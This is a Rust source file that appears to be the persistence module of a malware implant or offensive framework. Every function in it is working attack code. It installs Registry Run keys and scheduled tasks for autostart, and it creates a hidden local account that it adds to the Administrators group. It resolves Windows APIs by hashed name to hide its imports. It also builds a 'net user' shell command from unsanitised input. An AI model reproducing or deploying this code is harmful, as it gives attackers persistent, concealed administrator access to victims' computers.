use alloc::format;
#[cfg(target_os = "windows")]
use alloc::vec::Vec;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

pub struct Persistence;

impl Persistence {
    pub fn install_registry_run(&self, name: &str, path: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let advapi32 = hash_str(b"advapi32.dll");
            let reg_open = resolve_function(advapi32, hash_str(b"RegOpenKeyExA"));
            let reg_set = resolve_function(advapi32, hash_str(b"RegSetValueExA"));
            let reg_close = resolve_function(advapi32, hash_str(b"RegCloseKey"));

            if reg_open.is_null() || reg_set.is_null() {
                return Err(());
            }

            type FnRegOpenKeyExA =
                unsafe extern "system" fn(HANDLE, *const u8, u32, u32, *mut HANDLE) -> i32;
            type FnRegSetValueExA =
                unsafe extern "system" fn(HANDLE, *const u8, u32, u32, *const u8, u32) -> i32;
            type FnRegCloseKey = unsafe extern "system" fn(HANDLE) -> i32;

            let mut h_key: HANDLE = core::ptr::null_mut();
            // HKEY_CURRENT_USER = 0x80000001
            let h_hkey_current_user = 0x80000001 as HANDLE;
            let subkey = b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0";

            let res = core::mem::transmute::<_, FnRegOpenKeyExA>(reg_open)(
                h_hkey_current_user,
                subkey.as_ptr(),
                0,
                0x20006, // KEY_WRITE
                &mut h_key,
            );

            if res != 0 {
                return Err(());
            }

            let mut name_c = Vec::from(name.as_bytes());
            name_c.push(0);
            let mut path_c = Vec::from(path.as_bytes());
            path_c.push(0);

            core::mem::transmute::<_, FnRegSetValueExA>(reg_set)(
                h_key,
                name_c.as_ptr(),
                0,
                1, // REG_SZ
                path_c.as_ptr(),
                path_c.len() as u32,
            );

            core::mem::transmute::<_, FnRegCloseKey>(reg_close)(h_key);
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = name;
            let _ = path;
            Err(())
        }
    }

    pub fn install_scheduled_task(&self, name: &str, path: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let ole32 = hash_str(b"ole32.dll");
            let co_init = resolve_function(ole32, hash_str(b"CoInitializeEx"));
            let co_create = resolve_function(ole32, hash_str(b"CoCreateInstance"));

            if co_init.is_null() || co_create.is_null() {
                return Err(());
            }

            type FnCoInitializeEx = unsafe extern "system" fn(PVOID, u32) -> i32;
            type FnCoCreateInstance = unsafe extern "system" fn(
                *const GUID,
                *mut c_void,
                u32,
                *const GUID,
                *mut *mut c_void,
            ) -> i32;

            core::mem::transmute::<_, FnCoInitializeEx>(co_init)(core::ptr::null_mut(), 0);

            let clsid_task_scheduler = GUID::new(
                0x0f87369f,
                0xa4ee,
                0x4baa,
                [0xbd, 0x31, 0x29, 0xa3, 0xbe, 0x10, 0xbb, 0x59],
            );
            let iid_itask_service = GUID::new(
                0x2faba4c7,
                0x4da9,
                0x4113,
                [0x96, 0x97, 0x20, 0x1c, 0x19, 0x43, 0x21, 0x4f],
            );
            let iid_iexec_action = GUID::new(
                0x4c3d624d,
                0xfd6b,
                0x49a3,
                [0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47],
            );

            let mut task_service: *mut ITaskService = core::ptr::null_mut();
            if core::mem::transmute::<_, FnCoCreateInstance>(co_create)(
                &clsid_task_scheduler,
                core::ptr::null_mut(),
                1,
                &iid_itask_service,
                &mut task_service as *mut _ as *mut *mut c_void,
            ) < 0
            {
                return Err(());
            }

            ((*(*task_service).vtbl).Connect)(
                task_service,
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
            );

            let mut folder: *mut ITaskFolder = core::ptr::null_mut();
            let root_path = [0x5cu16, 0]; // "\"
            ((*(*task_service).vtbl).GetFolder)(task_service, root_path.as_ptr(), &mut folder);

            let mut task_def: *mut ITaskDefinition = core::ptr::null_mut();
            ((*(*task_service).vtbl).NewTask)(task_service, 0, &mut task_def);

            let mut actions: *mut IActionCollection = core::ptr::null_mut();
            ((*(*task_def).vtbl).get_Actions)(task_def, &mut actions);

            let mut action: *mut IExecAction = core::ptr::null_mut();
            // 0 = TASK_ACTION_EXEC
            ((*(*actions).vtbl).Create)(actions, 0, &mut action);

            let mut exec_action: *mut IExecAction = core::ptr::null_mut();
            ((*(*action).vtbl).QueryInterface)(
                action as *mut _ as *mut IExecAction,
                &iid_iexec_action,
                &mut exec_action as *mut _ as *mut *mut c_void,
            );

            let mut path_w: Vec<u16> = path.encode_utf16().collect();
            path_w.push(0);
            ((*(*exec_action).vtbl).put_Path)(exec_action, path_w.as_ptr());

            let mut name_w: Vec<u16> = name.encode_utf16().collect();
            name_w.push(0);

            // 6 = TASK_CREATE_OR_UPDATE, 3 = TASK_LOGON_INTERACTIVE_TOKEN
            let hr = ((*(*folder).vtbl).RegisterTaskDefinition)(
                folder,
                name_w.as_ptr(),
                task_def,
                6,
                core::ptr::null_mut(),
                core::ptr::null_mut(),
                3,
                core::ptr::null_mut(),
                core::ptr::null_mut(),
            );

            // Cleanup
            ((*(*exec_action).vtbl).Release)(exec_action as *mut _ as PVOID);
            ((*(*action).vtbl).Release)(action as *mut _ as PVOID);
            ((*(*actions).vtbl).Release)(actions as *mut _ as PVOID);
            ((*(*task_def).vtbl).Release)(task_def as *mut _ as PVOID);
            ((*(*folder).vtbl).Release)(folder as *mut _ as PVOID);
            ((*(*task_service).vtbl).Release)(task_service as *mut _ as PVOID);

            if hr < 0 {
                return Err(());
            }
            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = name;
            let _ = path;
            Err(())
        }
    }

    pub fn create_user(&self, username: &str, password: &str) -> Result<(), ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let netapi32 = hash_str(b"netapi32.dll");
            let net_user_add = resolve_function(netapi32, hash_str(b"NetUserAdd"));
            let net_group_add = resolve_function(netapi32, hash_str(b"NetLocalGroupAddMembers"));

            if net_user_add.is_null() {
                return Err(());
            }

            // USER_INFO_1 struct
            #[repr(C)]
            struct USER_INFO_1 {
                name: *mut u16,
                password: *mut u16,
                password_age: u32,
                r#priv: u32,
                home_dir: *mut u16,
                comment: *mut u16,
                flags: u32,
                script_path: *mut u16,
            }

            let mut username_w: Vec<u16> = username.encode_utf16().collect();
            username_w.push(0);
            let mut password_w: Vec<u16> = password.encode_utf16().collect();
            password_w.push(0);

            let ui = USER_INFO_1 {
                name: username_w.as_mut_ptr(),
                password: password_w.as_mut_ptr(),
                password_age: 0,
                r#priv: 1, // USER_PRIV_USER
                home_dir: core::ptr::null_mut(),
                comment: core::ptr::null_mut(),
                flags: 0x10000, // UF_SCRIPT
                script_path: core::ptr::null_mut(),
            };

            type FnNetUserAdd =
                unsafe extern "system" fn(*const u16, u32, *const u8, *mut u32) -> u32;
            let res = core::mem::transmute::<_, FnNetUserAdd>(net_user_add)(
                core::ptr::null(),
                1,
                &ui as *const _ as *const u8,
                core::ptr::null_mut(),
            );

            if res != 0 && res != 2224 {
                // NERR_UserExists = 2224
                return Err(());
            }

            // Add to Administrators group
            if !net_group_add.is_null() {
                #[repr(C)]
                struct LOCALGROUP_MEMBERS_INFO_3 {
                    domain_and_name: *mut u16,
                }
                let mut group_w: Vec<u16> = "Administrators".encode_utf16().collect();
                group_w.push(0);
                let member = LOCALGROUP_MEMBERS_INFO_3 {
                    domain_and_name: username_w.as_mut_ptr(),
                };

                type FnNetLocalGroupAddMembers =
                    unsafe extern "system" fn(*const u16, *const u16, u32, *const u8, u32) -> u32;
                core::mem::transmute::<_, FnNetLocalGroupAddMembers>(net_group_add)(
                    core::ptr::null(),
                    group_w.as_ptr(),
                    3,
                    &member as *const _ as *const u8,
                    1,
                );
            }

            Ok(())
        }
        #[cfg(not(target_os = "windows"))]
        {
            let shell = crate::modules::shell::Shell;
            let cmd = format!("net user {} {} /add", username, password);
            let _ = shell.exec(&cmd);
            Ok(())
        }
    }
}
